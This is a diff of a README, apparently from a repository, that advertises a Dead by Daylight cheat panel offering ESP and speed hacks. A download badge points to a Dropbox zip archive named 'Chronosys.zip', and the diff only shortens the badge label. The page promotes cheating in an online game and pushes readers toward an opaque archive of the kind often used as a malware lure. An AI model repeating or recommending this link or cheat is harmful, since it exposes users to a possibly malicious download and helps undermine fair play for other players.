@@ -1,6 +1,6 @@
 # Dead by Daylight Cheat 👻 | Survive or Hunt with Power ⚡️
 
-[![Download Dead by Daylight Cheat](https://img.shields.io/badge/Download-Dead-by-Daylight%20Cheat-blueviolet)](https://www.dropbox.com/scl/fi/twquoia4lencjnk3nb0z5/Chronosys.zip?rlkey=bnmszc7plqna5dor2m0oxvqsw&st=hthmsxfb&dl=1)
+[![Download DbD Cheat](https://img.shields.io/badge/Download-Dead-by-Daylight%20Cheat-blueviolet)](https://www.dropbox.com/scl/fi/twquoia4lencjnk3nb0z5/Chronosys.zip?rlkey=bnmszc7plqna5dor2m0oxvqsw&st=hthmsxfb&dl=1)
 
 Unlock the shadows in **Dead by Daylight** with this powerful cheat panel, built for both killers and survivors. Gain unfair advantages like **ESP**, **speed hacks**, and more! 🔪🎯  
 - 👁️ **ESP for Killers & Survivors**  
